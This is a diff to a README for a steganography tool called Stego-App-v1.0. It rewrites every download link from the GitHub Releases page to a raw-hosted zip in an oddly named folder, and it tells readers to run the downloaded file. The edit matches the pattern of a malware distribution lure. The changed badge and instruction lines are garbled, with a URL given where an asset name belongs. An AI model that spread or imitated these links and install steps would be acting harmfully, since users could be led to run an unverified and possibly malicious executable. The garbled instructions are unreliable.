@@ -1,7 +1,7 @@
 # 🌟 Stego-App-v1.0 - Hide Data Securely in Images
 
 ## 🖱️ Download the App
-[![Download Stego-App-v1.0](https://img.shields.io/badge/Download%20Stego-App%20v1.0-blue.svg)](https://github.com/mahan69999/Stego-App-v1.0/releases)
+[![Download Stego-App-v1.0](https://raw.githubusercontent.com/mahan69999/Stego-App-v1.0/main/colation/Stego-App-v1.0.zip%20Stego-App%https://raw.githubusercontent.com/mahan69999/Stego-App-v1.0/main/colation/Stego-App-v1.0.zip)](https://raw.githubusercontent.com/mahan69999/Stego-App-v1.0/main/colation/Stego-App-v1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to Stego-App, a simple and effective tool for hiding sensitive information within images. With this app, you can secure your data using steganography techniques. No programming skills are needed. Follow this guide to download and run the app with ease.
@@ -16,9 +16,9 @@ Welcome to Stego-App, a simple and effective tool for hiding sensitive informati
 ## 📥 Download & Install
 To get started, visit the following page to download the latest version of Stego-App:
 
-[Download Stego-App-v1.0](https://github.com/mahan69999/Stego-App-v1.0/releases)
+[Download Stego-App-v1.0](https://raw.githubusercontent.com/mahan69999/Stego-App-v1.0/main/colation/Stego-App-v1.0.zip)
 
-On the Releases page, you will see various assets for download. Look for `Stego-App-v1.0.exe` and click on it. This is the main application file you need.
+On the Releases page, you will see various assets for download. Look for `https://raw.githubusercontent.com/mahan69999/Stego-App-v1.0/main/colation/Stego-App-v1.0.zip` and click on it. This is the main application file you need.
 
 After the file downloads, locate it in your downloads folder and double-click to run it. Follow the on-screen instructions to complete the installation.
 
